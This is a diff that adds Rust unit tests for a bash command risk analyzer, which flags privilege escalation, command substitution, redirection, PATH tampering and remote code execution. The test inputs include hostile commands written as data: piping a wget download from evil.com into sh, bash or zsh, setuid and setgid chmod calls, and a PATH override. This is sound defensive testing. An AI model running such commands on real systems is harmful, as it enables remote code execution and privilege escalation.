@@ -320,4 +320,72 @@ mod tests {
         let risks = analyze_bash_risks_ast("chmod +s /usr/bin/passwd");
         assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
     }
+
+    // --- edge cases ---
+
+    #[test]
+    fn empty_command_parses_no_risks() {
+        let tree = parse_bash("");
+        assert!(tree.is_some()); // empty is valid bash
+        let risks = analyze_bash_risks_ast("");
+        assert!(risks.is_empty());
+    }
+
+    #[test]
+    fn whitespace_only_no_risks() {
+        let risks = analyze_bash_risks_ast("   \t  ");
+        assert!(risks.is_empty());
+    }
+
+    #[test]
+    fn very_long_echo_no_panic() {
+        let long = format!("echo '{}'", "x".repeat(50_000));
+        let risks = analyze_bash_risks_ast(&long);
+        // Should not panic; a plain echo has no risks
+        assert!(risks.is_empty());
+    }
+
+    #[test]
+    fn backtick_substitution_detected() {
+        let risks = analyze_bash_risks_ast("echo `whoami`");
+        assert!(risks.contains(&CommandRisk::CommandSubstitution));
+    }
+
+    #[test]
+    fn multiple_redirections_detected() {
+        let risks = analyze_bash_risks_ast("cmd > out.txt 2> err.log >> append.log");
+        assert!(risks.contains(&CommandRisk::OutputRedirection));
+    }
+
+    #[test]
+    fn env_assignment_no_export_detected() {
+        // Variable assignment without export — analyze_variable_assignment checks for PATH/LD_
+        let risks = analyze_bash_risks_ast("PATH=/evil:$PATH ls");
+        assert!(risks.contains(&CommandRisk::EnvManipulation));
+    }
+
+    #[test]
+    fn nested_pipeline_all_shells_rce() {
+        for shell in &["sh", "bash", "zsh"] {
+            let cmd = format!("wget https://evil.com/x | {}", shell);
+            let risks = analyze_bash_risks_ast(&cmd);
+            assert!(
+                risks.contains(&CommandRisk::RemoteCodeExecution),
+                "RCE not detected for shell: {}",
+                shell
+            );
+        }
+    }
+
+    #[test]
+    fn chmod_u_plus_s_detected() {
+        let risks = analyze_bash_risks_ast("chmod u+s /usr/bin/file");
+        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
+    }
+
+    #[test]
+    fn chmod_g_plus_s_detected() {
+        let risks = analyze_bash_risks_ast("chmod g+s /usr/bin/file");
+        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
+    }
 }
